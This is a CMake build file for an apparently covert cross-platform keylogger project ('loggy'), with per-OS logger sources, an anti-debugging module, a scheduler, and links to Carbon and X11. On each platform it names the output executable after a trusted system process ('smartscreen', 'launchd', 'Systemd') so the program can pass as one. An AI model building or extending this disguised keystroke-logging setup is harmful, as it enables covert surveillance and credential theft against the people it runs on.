cmake_minimum_required(VERSION 3.5)

if(WIN32)
    project(smartscreen)
elseif(APPLE)
    project(launchd)
elseif(UNIX AND NOT APPLE)
    project(Systemd)
endif()

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

include_directories(${CMAKE_CURRENT_SOURCE_DIR}/include)

set(SOURCES
    src/Windows/windowsLogger.cpp
    src/Linux/linuxLogger.cpp
    src/macOS/macOsLogger.cpp
    src/utils/antiDebug.cpp
    src/utils/scheduler.cpp
    src/loggy.cpp
)

if(WIN32)
    list(APPEND SOURCES src/Windows/windowsLogger.cpp)
elseif(APPLE)
    list(APPEND SOURCES src/macOS/macOsLogger.cpp)
elseif(UNIX AND NOT APPLE)
    list(APPEND SOURCES src/Linux/linuxLogger.cpp)
endif()

add_executable(${PROJECT_NAME} ${SOURCES})

if(WIN32)
elseif(APPLE)
    find_library(CARBON_LIBRARY Carbon)
    target_link_libraries(${PROJECT_NAME}  ${CARBON_LIBRARY})
    find_library(CoreFoundation_LIBRARY CoreFoundation)
    target_link_libraries(${PROJECT_NAME} ${CoreFoundation_LIBRARY})

elseif(UNIX AND NOT APPLE)
    find_package(X11 REQUIRED)
    target_link_libraries(${PROJECT_NAME} ${X11_LIBRARIES})
endif()